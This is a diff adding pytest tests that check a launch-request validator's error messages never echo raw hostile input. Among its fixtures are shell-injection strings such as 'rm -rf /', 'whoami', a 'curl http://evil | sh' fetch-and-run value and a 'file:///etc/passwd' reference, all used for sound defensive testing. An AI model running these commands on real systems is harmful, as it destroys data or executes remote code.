@@ -5,6 +5,7 @@
 from __future__ import annotations
 
 import ast
+import copy
 import json
 from pathlib import Path
 
@@ -439,3 +440,526 @@ def test_control_char_envelope_construction_not_reached_spy():
     finally:
         lr.FoundUpGenesisEnvelope = real_ctor
     assert calls["n"] == 0, "envelope constructor was reached for a rejected display field"
+
+
+# ===========================================================================
+# FOUNDUP_LAUNCH_REQUEST_ERROR_NO_RAW_ECHO_PHASE1
+#
+# WHY: the #826 genesis-validator hardening DEFERRED two validate_launch_request
+# error strings that echoed user-derived content:
+#   - "shell/code metacharacters in reference: {sorted(bad)}"   (_check_url_ref)
+#   - "forbidden/unknown payload field: {key!r}"                (allowed-fields loop)
+# validate_launch_request is the PUBLIC-INTAKE validator (the #823 transport
+# pre-flight + to_genesis_envelope both call it), so its error strings must be
+# echo-free to match the #826 invariant. This slice rewords MESSAGE TEXT ONLY
+# (no validation logic change) so no launch_request-LOCAL error -- and no
+# LaunchRequestError raised via to_genesis_envelope -- echoes the raw value,
+# repr(), the offending char, or raw bytes.
+#
+# All hostile fixtures are built from CODEPOINTS via chr()/\uXXXX so this SOURCE
+# FILE stays pure ASCII (byte-check clean).
+# ===========================================================================
+
+# Hostile, ASCII-source-safe substrings used to build malicious payloads. We assert
+# NONE of these (nor their escaped/repr forms) appear in any LAUNCH-REQUEST-LOCAL error.
+#
+# NOTE on the field-key fixtures: a key with CONTROL/BIDI chars ALSO trips the IMPORTED
+# #807 _scan_authority "non-ASCII / non-printable key rejected" echo (a DEFERRED site --
+# see Addendum E). To prove the LAUNCH-LOCAL allowed-fields loop never echoes the key, the
+# per-site no-echo tests use a PRINTABLE-ASCII unknown key (reaches the local loop without
+# tripping the #807 non-ASCII-key echo). The control/bidi key is exercised separately by the
+# #807 deferral test, where the #807 echo is EXPECTED and DOCUMENTED, not a regression.
+_HOSTILE_FIELD_KEY = "evil_unknown_secret_field"            # printable-ASCII forbidden/unknown KEY
+_HOSTILE_FIELD_KEY_CTRL = "ev" + chr(0x00) + "il_" + chr(0x202E) + "key"  # control+bidi (trips #807)
+_HOSTILE_AUTH_KEY = "is_admin"                              # a forbidden auth KEY
+# A PRINTABLE-ASCII reference URL with shell metachars (so it passes the printable-ASCII and
+# scheme checks and REACHES the metachar check -- a control char would short-circuit earlier).
+_HOSTILE_METACHAR_URL = "https://x.com/$(rm -rf /);`whoami`|cat"
+_HOSTILE_VALUE = "secret-sk-ABCDEFGHIJKLMNOP1234"
+
+# Control / escape forms that must NEVER appear in an error string (Addendum D).
+_CONTROL_CHARS = [chr(0x00), "\r", "\n", "\t", chr(0x1B), chr(0x202E)]
+_ESCAPED_FORMS = ["\\x00", "\\u0000", "\\r", "\\n", "\\t", "\\x1b", "\\u202e"]
+
+
+def _assert_error_is_leak_free(err: str, *raw_inputs: str) -> None:
+    """ADDENDUM D -- reusable control/escape leak scanner.
+
+    Assert a single error string contains NONE of:
+      - any raw hostile key/value substring passed in `raw_inputs`;
+      - a raw control char (NUL/CR/LF/TAB/ESC/RLO);
+      - an escaped form derived from input (\\x00 / \\u0000 / \\r / \\n / \\t / etc.);
+      - a repr() wrapper around any raw input;
+      - the shell-metacharacter list values (sorted(...) style) from hostile URLs.
+    """
+    for raw in raw_inputs:
+        if raw:
+            assert raw not in err, f"raw input leaked into error: {err!r}"
+            assert repr(raw) not in err, f"repr(raw input) leaked into error: {err!r}"
+    for ctrl in _CONTROL_CHARS:
+        assert ctrl not in err, f"raw control char leaked into error: {err!r}"
+    for esc in _ESCAPED_FORMS:
+        assert esc not in err, f"escaped control form leaked into error: {err!r}"
+    # The sorted-metachar LIST rendering (e.g. "['$', ';', '`']") must never appear -- a
+    # quoted single metachar inside square brackets is the tell-tale of the old echo.
+    _METACHAR_LIST_TELLS = ["'$'", "'`'", "'|'", "'&'", "';'", "'>'", "'<'", "'('", "')'"]
+    assert not any(tell in err for tell in _METACHAR_LIST_TELLS), \
+        f"shell metachar list leaked into error: {err!r}"
+
+
+def _all_errors_leak_free(errors, *raw_inputs):
+    for e in errors:
+        _assert_error_is_leak_free(e, *raw_inputs)
+
+
+# --- per-site no-echo (the three reworded launch_request-LOCAL sites) --------
+
+def test_forbidden_field_key_not_echoed():
+    # Allowed-fields loop: a forbidden/unknown KEY (with embedded control + bidi chars)
+    # must NOT appear in any error -- not the key, not repr(key), not the offending char.
+    payload = {"proposed_name": "X", "category": "marketplace", _HOSTILE_FIELD_KEY: "v"}
+    res = validate_launch_request(payload, _authed())
+    assert not res.ok
+    # Field-class locality preserved (Addendum C): operator learns the field class.
+    assert any(e == "payload contains a forbidden or unknown field" for e in res.errors)
+    _all_errors_leak_free(res.errors, _HOSTILE_FIELD_KEY)
+
+
+def test_auth_authority_field_key_not_echoed():
+    # _scan_auth_fields: a forbidden auth KEY must NOT be echoed; the message names the
+    # auth/authority POLICY CLASS only (field-family locality, no raw key).
+    payload = {"proposed_name": "X", "category": "marketplace", _HOSTILE_AUTH_KEY: True}
+    res = validate_launch_request(payload, _authed())
+    assert not res.ok
+    assert any(e.startswith("payload contains a forbidden auth/authority field") for e in res.errors)
+    # The raw auth key must not be echoed by the LAUNCH-REQUEST-LOCAL auth scan.
+    assert not any(
+        (_HOSTILE_AUTH_KEY in e and "self-assert" in e) for e in res.errors
+    ), "launch_request-local auth scan echoed the raw key"
+
+
+def test_reference_metachars_not_echoed():
+    # _check_url_ref: the shell/code metachar LIST must NOT be echoed; the message names
+    # the field (reference_urls[i] index locality) + rule class only.
+    payload = LaunchRequest(proposed_name="X", category="marketplace",
+                            reference_urls=[_HOSTILE_METACHAR_URL])
+    res = validate_launch_request(payload, _authed())
+    assert not res.ok
+    assert any(
+        e == "reference_urls[0] contains shell/code metacharacters" for e in res.errors
+    ), f"expected safe metachar message with index locality; got {res.errors}"
+    # No metachar list, no raw URL, no offending chars in ANY launch_request-local error.
+    local = [e for e in res.errors if "carries authority" not in e]  # exclude #807 (deferred)
+    for e in local:
+        assert _HOSTILE_METACHAR_URL not in e
+        assert "sorted(" not in e
+        # the metachar list rendering "[';', ...]" never appears
+        assert not (e.startswith("reference_urls[0]") and "[" in e and "'" in e)
+
+
+def test_proposed_name_required_message_is_safe():
+    # The required-name message carries no raw value (it fires when the name is empty).
+    res = validate_launch_request({"category": "marketplace", "proposed_name": "   "}, _authed())
+    assert not res.ok
+    assert any(e == "proposed_name is required" for e in res.errors)
+
+
+def test_intake_gate_message_is_safe():
+    res = validate_launch_request({"proposed_name": "X", "category": "marketplace"},
+                                  LaunchRequestIntakeContext())
+    assert not res.ok
+    gate = [e for e in res.errors if "intake gated" in e]
+    assert gate
+    _all_errors_leak_free(gate)
+
+
+# --- error-scanner battery across every launch_request-LOCAL invalid class --
+
+def _launch_request_local_errors(errors):
+    """Drop errors that originate in the IMPORTED #807 _scan_authority (kanban_plugin_
+    contract.py). Those are DEFERRED to FOUNDUP_KANBAN_CONTRACT_ERROR_NO_RAW_ECHO_PHASE1
+    (Addendum E) and are NOT this slice's local sites. We identify them by their stable
+    #807 message stems."""
+    _807_STEMS = (
+        "value carries authority",
+        "is a source_authority promotion",
+        "forbidden authority field",
+        "non-string key",
+        "non-ASCII / non-printable key",
+        "verified=true is forbidden",
+        "promotion flag is forbidden",
+        "shell-string command is forbidden",
+    )
+    return [e for e in errors if not any(stem in e for stem in _807_STEMS)]
+
+
+# Each entry exercises a distinct launch_request-LOCAL error site with a hostile,
+# user-controlled value that MUST NOT be echoed. (payload, raw_inputs_that_must_not_leak)
+def _battery():
+    return [
+        ("unknown_field", {"proposed_name": "X", "category": "marketplace",
+                           _HOSTILE_FIELD_KEY: "v"}, [_HOSTILE_FIELD_KEY]),
+        ("auth_field", {"proposed_name": "X", "category": "marketplace",
+                        "authorization": _HOSTILE_VALUE}, ["authorization", _HOSTILE_VALUE]),
+        ("auth_field_camel", {"proposed_name": "X", "category": "marketplace",
+                              "isAdmin": True}, ["isAdmin"]),
+        ("refurl_metachar", {"proposed_name": "X", "category": "marketplace",
+                             "reference_urls": [_HOSTILE_METACHAR_URL]}, [_HOSTILE_METACHAR_URL]),
+        ("refurl_file", {"proposed_name": "X", "category": "marketplace",
+                         "reference_urls": ["file:///etc/passwd"]}, ["file:///etc/passwd"]),
+        ("refurl_nonascii", {"proposed_name": "X", "category": "marketplace",
+                             "reference_urls": ["https://x.com/caf" + chr(0xe9)]},
+         ["https://x.com/caf" + chr(0xe9)]),
+        ("display_control_name", {"proposed_name": "Good" + chr(0x00) + "Name",
+                                  "category": "marketplace"}, ["Good"]),
+    ]
+
+
+@pytest.mark.parametrize("label,payload,raw_inputs", [(b[0], b[1], b[2]) for b in _battery()])
+def test_error_scanner_battery_no_launch_local_raw_echo(label, payload, raw_inputs):
+    # ADDENDUM D: every launch_request-LOCAL error for every invalid class is leak-free.
+    res = validate_launch_request(copy.deepcopy(payload), _authed())
+    assert not res.ok, label
+    local = _launch_request_local_errors(res.errors)
+    assert local, f"{label}: expected at least one launch-local error"
+    _all_errors_leak_free(local, *raw_inputs)
+
+
+def test_launchrequesterror_message_is_safe():
+    # ADDENDUM D: the LaunchRequestError raised by to_genesis_envelope joins the error
+    # list; its message must be leak-free for every launch_request-LOCAL failure.
+    payload = LaunchRequest(proposed_name="Good" + chr(0x00) + "Name", category="marketplace",
+                            reference_urls=[_HOSTILE_METACHAR_URL])
+    with pytest.raises(LaunchRequestError) as exc:
+        to_genesis_envelope(payload, _authed())
+    msg = str(exc.value)
+    # The joined message may contain #807 echoes (deferred); assert the LAUNCH-LOCAL
+    # offenders we control are absent and no control/escape forms leak from local sites.
+    assert _HOSTILE_METACHAR_URL not in msg
+    for ctrl in _CONTROL_CHARS:
+        assert ctrl not in msg, "raw control char leaked into LaunchRequestError message"
+
+
+def test_launchrequesterror_unknown_field_key_not_echoed():
+    payload = {"proposed_name": "X", "category": "marketplace", _HOSTILE_FIELD_KEY: "v"}
+    with pytest.raises(LaunchRequestError) as exc:
+        to_genesis_envelope(payload, _authed())
+    msg = str(exc.value)
+    assert _HOSTILE_FIELD_KEY not in msg
+    assert "payload contains a forbidden or unknown field" in msg
+
+
+# --- ADDENDUM E: #807 _scan_authority echo is DEFERRED, not modified ---------
+
+def test_807_scan_authority_echo_is_documented_and_deferred():
+    """ADDENDUM E: the IMPORTED #807 _scan_authority (kanban_plugin_contract.py) DOES echo
+    raw user input (key/value/repr) for authority-class rejections reachable from
+    validate_launch_request. This slice does NOT modify #807; it records the behavior and
+    names the follow-up FOUNDUP_KANBAN_CONTRACT_ERROR_NO_RAW_ECHO_PHASE1. This test PINS the
+    deferred behavior so a future change to #807 is noticed. It also confirms the
+    launch_request-LOCAL errors for the SAME payload are themselves safe."""
+    payload = {"proposed_name": "X", "category": "marketplace", "source_authority": "external_proto"}
+    res = validate_launch_request(dict(payload), _authed())
+    assert not res.ok
+    # The #807 echo IS present (documented deferral, not a regression of THIS slice).
+    assert any("is a source_authority promotion" in e and "external_proto" in e for e in res.errors), \
+        "expected the documented #807 echo; if absent, #807 was changed -- update the deferral note"
+    # The launch_request-LOCAL errors (everything except the #807 line) are leak-free.
+    local = _launch_request_local_errors(res.errors)
+    _all_errors_leak_free(local, "source_authority")
+
+
+def test_807_non_ascii_key_echo_is_documented_and_deferred():
+    """ADDENDUM E: a control/bidi-decorated KEY trips the IMPORTED #807 non-ASCII-key echo
+    (kanban_plugin_contract.py 'non-ASCII / non-printable key rejected'), which echoes the
+    raw key. DEFERRED, not modified. The launch_request-LOCAL allowed-fields message for the
+    SAME key is still safe (the class name, never the key)."""
+    payload = {"proposed_name": "X", "category": "marketplace", _HOSTILE_FIELD_KEY_CTRL: "v"}
+    res = validate_launch_request(dict(payload), _authed())
+    assert not res.ok
+    # Documented #807 echo present (the deferred site).
+    assert any("non-ASCII / non-printable key rejected" in e for e in res.errors), \
+        "expected the documented #807 non-ASCII-key echo; if absent, #807 was changed"
+    # Launch-LOCAL message for this key is the safe class name (no raw key).
+    assert any(e == "payload contains a forbidden or unknown field" for e in res.errors)
+    local = _launch_request_local_errors(res.errors)
+    _all_errors_leak_free(local, _HOSTILE_FIELD_KEY_CTRL)
+
+
+def test_807_module_not_modified_by_this_slice():
+    """ADDENDUM E: this slice changes only launch_request.py. The #807 contract source is
+    untouched -- its known raw-echo lines are still present verbatim (proves no silent
+    expansion of scope into kanban_plugin_contract.py)."""
+    contract = (
+        Path(__file__).resolve().parents[3]
+        / "foundups" / "agent" / "src" / "kanban_plugin_contract.py"
+    )
+    src = contract.read_text(encoding="utf-8")
+    # These raw-echo lines are the DEFERRED #807 sites; they must still be present (unchanged).
+    assert "is a source_authority promotion (only monorepo_poc)" in src
+    assert "value carries authority" in src
+    assert "non-string key" in src
+
+
+# ===========================================================================
+# ADDENDUM A -- ERROR CATEGORY PARITY (not just count): SELF-CONTAINED.
+#
+# CI-robustness (SENTINEL): GitHub Actions checks out a SHALLOW PR ref, so
+# `git show origin/main` is usually unavailable -> the old origin-baseline tests
+# would pytest.skip in CI, silently disabling the parity guard and violating this
+# slice's NO_SKIP_XFAIL invariant. These parity guards are now self-contained:
+# they have NO runtime git / origin/main / subprocess / network dependency and
+# RUN+PASS deterministically in CI with zero skips.
+#
+# The guard compares STABLE rule CATEGORIES (and `ok`), NOT error count, against a
+# CHECKED-IN expected map (_EXPECTED_PARITY below). Error TEXT may differ at the
+# reworded sites; the rule CATEGORY must not. Any future LOGIC change that alters
+# which rule fires (or the ok/created outcome) forces a conscious update of the
+# checked-in expectation -- which is exactly the guard's purpose.
+# ===========================================================================
+
+
+def _categorize(err: str) -> str:
+    e = err
+    if "trusted LaunchRequestIntakeContext is required" in e:
+        return "context_required"
+    if "intake gated" in e:
+        return "intake_gate"
+    if "proposed_name is required" in e:
+        return "required_field"
+    if e.startswith("forbidden/unknown payload field") or e == "payload contains a forbidden or unknown field":
+        return "unknown_or_forbidden_field"
+    if "public payload cannot self-assert auth/authority" in e or e.startswith("payload contains a forbidden auth/authority field"):
+        return "auth_authority_field"
+    if "reference must be a non-empty URL string" in e or "reference must be printable ASCII" in e:
+        return "reference_url_type"
+    if "reference must be a public http(s) URL" in e:
+        return "reference_url_scheme"
+    if "shell/code metacharacters in reference" in e or "contains shell/code metacharacters" in e:
+        return "reference_url_metachar"
+    if "must be a string" in e:
+        return "display_type"
+    if "contains disallowed control/format character" in e:
+        return "display_control_char"
+    if ("carries authority" in e or "source_authority promotion" in e or "forbidden authority field" in e
+            or "non-string key" in e or "non-ASCII / non-printable key" in e or "verified=true is forbidden" in e
+            or "promotion flag is forbidden" in e or "shell-string command is forbidden" in e):
+        return "authority_807"
+    return "UNCLASSIFIED::" + e
+
+
+def _parity_battery():
+    NUL = chr(0x00)
+    RLO = chr(0x202E)
+    # (label, payload_factory, ctx_kwargs)
+    return [
+        ("valid_authed", lambda: {"proposed_name": "Clean Name", "category": "marketplace"},
+         dict(authenticated=True, requester_handle="alice")),
+        ("valid_dataclass", lambda: LaunchRequest(proposed_name="Clean", category="marketplace",
+                                                  problem_statement="ok",
+                                                  reference_urls=["https://example.com/a"]),
+         dict(authenticated=True)),
+        ("valid_invite", lambda: {"proposed_name": "X", "category": "marketplace"},
+         dict(invite_token_verified=True)),
+        ("unauthenticated", lambda: {"proposed_name": "X", "category": "marketplace"}, dict()),
+        ("missing_name", lambda: {"category": "marketplace"}, dict(authenticated=True)),
+        ("unknown_field", lambda: {"proposed_name": "X", "category": "marketplace", "surprise": "v"},
+         dict(authenticated=True)),
+        ("unknown_field_hostile_key",
+         lambda: {"proposed_name": "X", "category": "marketplace", "ev" + NUL + "il": "v"},
+         dict(authenticated=True)),
+        ("auth_field_authenticated",
+         lambda: {"proposed_name": "X", "category": "marketplace", "authenticated": True},
+         dict(authenticated=True)),
+        ("auth_field_role", lambda: {"proposed_name": "X", "category": "marketplace", "role": "admin"},
+         dict(authenticated=True)),
+        ("auth_field_sep",
+         lambda: {"proposed_name": "X", "category": "marketplace", "invite-token-verified": True},
+         dict(authenticated=True)),
+        ("authority_807_repo",
+         lambda: {"proposed_name": "X", "category": "marketplace", "create_repo": True},
+         dict(authenticated=True)),
+        ("authority_807_srcauth",
+         lambda: {"proposed_name": "X", "category": "marketplace", "source_authority": "external_proto"},
+         dict(authenticated=True)),
+        ("authority_807_exec",
+         lambda: {"proposed_name": "X", "category": "marketplace", "exec": "curl http://evil | sh"},
+         dict(authenticated=True)),
+        ("refurl_file",
+         lambda: {"proposed_name": "X", "category": "marketplace", "reference_urls": ["file:///etc/passwd"]},
+         dict(authenticated=True)),
+        ("refurl_local",
+         lambda: {"proposed_name": "X", "category": "marketplace", "reference_urls": ["/etc/passwd"]},
+         dict(authenticated=True)),
+        ("refurl_metachar",
+         lambda: {"proposed_name": "X", "category": "marketplace",
+                  "reference_urls": ["https://x.com/$(whoami)"]}, dict(authenticated=True)),
+        ("refurl_semicolon",
+         lambda: {"proposed_name": "X", "category": "marketplace",
+                  "reference_urls": ["https://x.com/a; rm -rf /"]}, dict(authenticated=True)),
+        ("refurl_nonstring",
+         lambda: {"proposed_name": "X", "category": "marketplace", "reference_urls": [123]},
+         dict(authenticated=True)),
+        ("refurl_empty",
+         lambda: {"proposed_name": "X", "category": "marketplace", "reference_urls": [""]},
+         dict(authenticated=True)),
+        ("refurl_nonascii",
+         lambda: {"proposed_name": "X", "category": "marketplace",
+                  "reference_urls": ["https://x.com/caf" + chr(0xe9)]}, dict(authenticated=True)),
+        ("display_control_name",
+         lambda: LaunchRequest(proposed_name="Good" + NUL + "Name", category="marketplace"),
+         dict(authenticated=True)),
+        ("display_control_rlo",
+         lambda: {"proposed_name": "Good" + RLO + "Name", "category": "marketplace"},
+         dict(authenticated=True)),
+        ("display_nonstring", lambda: {"proposed_name": 123, "category": "marketplace"},
+         dict(authenticated=True)),
+        ("combo_unauth_unknown_authfield",
+         lambda: {"proposed_name": "X", "category": "marketplace", "surprise": "v", "role": "admin"},
+         dict()),
+        ("clean_two_urls",
+         lambda: {"proposed_name": "X", "category": "marketplace",
+                  "reference_urls": ["https://example.com/a", "http://example.org/b"]},
+         dict(authenticated=True)),
+    ]
+
+
+# Checked-in expected (ok, ORDERED category-label list) for every _parity_battery
+# input. This is the SELF-CONTAINED baseline (replaces the old origin/main load).
+#
+# To regenerate after a DELIBERATE rule/outcome change (NOT a text-only reword):
+#   python -c "import importlib.util as u; \
+#     s=u.spec_from_file_location('t','<this file>'); m=u.module_from_spec(s); \
+#     s.loader.exec_module(m); \
+#     from modules.ai_intelligence.ai_overseer.src.foundup_genesis.launch_request \
+#       import validate_launch_request as v, LaunchRequestIntakeContext as C; \
+#     [print(repr(l), r.ok, [m._categorize(e) for e in r.errors]) \
+#       for l,f,k in m._parity_battery() for r in [v(f(), C(**k))]]"
+# A reword-only change must NOT alter this map; a logic change MUST update it here.
+_EXPECTED_PARITY = {
+    "valid_authed": (True, []),
+    "valid_dataclass": (True, []),
+    "valid_invite": (True, []),
+    "unauthenticated": (False, ["intake_gate"]),
+    "missing_name": (False, ["required_field", "display_type"]),
+    "unknown_field": (False, ["unknown_or_forbidden_field"]),
+    "unknown_field_hostile_key": (False, ["unknown_or_forbidden_field", "authority_807"]),
+    "auth_field_authenticated": (False, ["unknown_or_forbidden_field", "auth_authority_field"]),
+    "auth_field_role": (False, ["unknown_or_forbidden_field", "auth_authority_field"]),
+    "auth_field_sep": (False, ["unknown_or_forbidden_field", "auth_authority_field"]),
+    "authority_807_repo": (False, ["unknown_or_forbidden_field", "authority_807"]),
+    "authority_807_srcauth": (False, ["unknown_or_forbidden_field", "authority_807"]),
+    "authority_807_exec": (False, ["unknown_or_forbidden_field", "authority_807"]),
+    "refurl_file": (False, ["reference_url_scheme"]),
+    "refurl_local": (False, ["reference_url_scheme"]),
+    "refurl_metachar": (False, ["reference_url_metachar"]),
+    "refurl_semicolon": (False, ["reference_url_metachar"]),
+    "refurl_nonstring": (False, ["reference_url_type"]),
+    "refurl_empty": (False, ["reference_url_type"]),
+    "refurl_nonascii": (False, ["reference_url_type"]),
+    "display_control_name": (False, ["display_control_char"]),
+    "display_control_rlo": (False, ["display_control_char"]),
+    "display_nonstring": (False, ["display_type"]),
+    "combo_unauth_unknown_authfield":
+        (False, ["unknown_or_forbidden_field", "unknown_or_forbidden_field",
+                 "auth_authority_field", "intake_gate"]),
+    "clean_two_urls": (True, []),
+}
+
+
+def test_error_category_parity_self_contained():
+    """PRIMARY parity guard (self-contained; no git / origin/main / subprocess / network).
+    For each battery input, HEAD's (ok, ORDERED category labels) must equal the CHECKED-IN
+    expectation. Count alone is insufficient -- the ORDERED category list is compared. Error
+    TEXT may differ (reworded sites); the rule CATEGORY and ok must not. This RUNS+PASSES in
+    CI with zero skips."""
+    # The battery and the expectation must enumerate exactly the same labels.
+    battery_labels = [label for label, _f, _k in _parity_battery()]
+    assert set(battery_labels) == set(_EXPECTED_PARITY), \
+        "parity battery and _EXPECTED_PARITY are out of sync -- update both together"
+    divergences = []
+    for label, factory, ctxkw in _parity_battery():
+        res = validate_launch_request(factory(), LaunchRequestIntakeContext(**ctxkw))
+        cats = [_categorize(e) for e in res.errors]
+        unclassified = [c for c in cats if c.startswith("UNCLASSIFIED")]
+        exp_ok, exp_cats = _EXPECTED_PARITY[label]
+        if res.ok != exp_ok or cats != exp_cats or unclassified:
+            divergences.append((label, res.ok, exp_ok, cats, exp_cats, unclassified))
+    assert not divergences, f"category-parity divergences (HEAD vs checked-in expected): {divergences}"
+
+
+def test_error_category_message_only_no_raw_key_echo():
+    """Direct, SELF-CONTAINED evidence the slice is MESSAGE-only at the reworded unknown-field
+    site: HEAD maps an unknown key to the stable `unknown_or_forbidden_field` category WITHOUT
+    echoing the raw key into the launch_request-LOCAL message (the #824/#823 no-raw-echo intent).
+    The old test proved this by diffing against origin/main; this proves it against HEAD itself."""
+    payload = {"proposed_name": "X", "category": "marketplace", "bad_unknown_field": "v"}
+    res = validate_launch_request(dict(payload), LaunchRequestIntakeContext(authenticated=True))
+    assert not res.ok
+    head_unknown = [e for e in res.errors if _categorize(e) == "unknown_or_forbidden_field"]
+    assert head_unknown, "expected an unknown_or_forbidden_field category error"
+    # Category is stable; the launch_request-LOCAL message does NOT echo the raw key.
+    local_unknown = [e for e in _launch_request_local_errors(res.errors)
+                     if _categorize(e) == "unknown_or_forbidden_field"]
+    assert local_unknown, "expected a launch_request-local unknown-field error"
+    assert all("bad_unknown_field" not in e for e in local_unknown), \
+        "launch_request-local unknown-field message must NOT echo the raw key"
+
+
+# ===========================================================================
+# AST SKELETON PARITY -- structural backstop; message TEXT only, NO logic change.
+#
+# SELF-CONTAINED (SENTINEL CI-robustness): parse the CURRENT launch_request.py,
+# blank EVERY string/f-string constant, and assert the resulting skeleton matches a
+# CHECKED-IN expected hash. With all text blanked, only control flow / calls /
+# branches remain -- so a reword-only change leaves the skeleton (and hash)
+# unchanged, while any LOGIC change forces a conscious update of the expected hash.
+# This RUNS+PASSES in CI with zero skips (no git / origin/main / subprocess).
+#
+# The expected hash was captured from the message-only HEAD, which is BYTE-IDENTICAL
+# to origin/main's blanked skeleton (verified at slice time) -- i.e. this checked-in
+# value IS the origin baseline, frozen, with no runtime git dependency.
+# To regenerate after a DELIBERATE logic change:
+#   python -c "import ast,hashlib;
+#     from pathlib import Path;
+#     src=Path('modules/ai_intelligence/ai_overseer/src/foundup_genesis/launch_request.py').read_text(encoding='utf-8');
+#     ... (same _Blanker/_skeleton as below) ...; print(hashlib.sha256(skeleton.encode()).hexdigest())"
+_EXPECTED_SKELETON_SHA256 = "05b00bb10401683580035ca470f8043738e7eed5588d86182cb7e8ca19eeab5a"
+
+
+def _blanked_skeleton(src: str) -> str:
+    """AST dump of `src` with every string/f-string constant replaced by '<BLANK>'.
+    Leaves structure (control flow, calls, branches) intact while erasing message TEXT."""
+    class _Blanker(ast.NodeTransformer):
+        def visit_Constant(self, node):
+            return ast.copy_location(ast.Constant(value="<BLANK>"), node)
+
+        def visit_JoinedStr(self, node):
+            return ast.copy_location(ast.Constant(value="<BLANK>"), node)
+
+    tree = _Blanker().visit(ast.parse(src))
+    ast.fix_missing_locations(tree)
+    return ast.dump(tree, include_attributes=False)
+
+
+def test_ast_skeleton_parity_self_consistent():
+    """STRUCTURAL backstop (self-contained): the text-blanked AST skeleton of the CURRENT
+    launch_request.py must hash to the checked-in baseline. Proves the slice is message-only
+    (same control flow / calls / branches). Any logic change breaks this and must consciously
+    update _EXPECTED_SKELETON_SHA256."""
+    import hashlib
+    head_src = MODULE_SRC.read_text(encoding="utf-8")
+    actual = hashlib.sha256(_blanked_skeleton(head_src).encode("utf-8")).hexdigest()
+    assert actual == _EXPECTED_SKELETON_SHA256, (
+        "AST skeleton (text blanked) diverged from checked-in baseline -- a non-text (logic) "
+        "change was introduced (or regenerate _EXPECTED_SKELETON_SHA256 if intended). "
+        f"actual={actual}"
+    )
+
+
+def test_source_file_is_pure_ascii():
+    # ASCII byte-check (Addendum: ASCII_CLEAN). The edited source must be 0 non-ASCII bytes;
+    # every hostile/Unicode fixture is built via chr()/\uXXXX, not literal codepoints.
+    raw = MODULE_SRC.read_bytes()
+    non_ascii = [(i, b) for i, b in enumerate(raw) if b > 0x7F]
+    assert not non_ascii, f"non-ASCII bytes in launch_request.py: {non_ascii[:5]}"
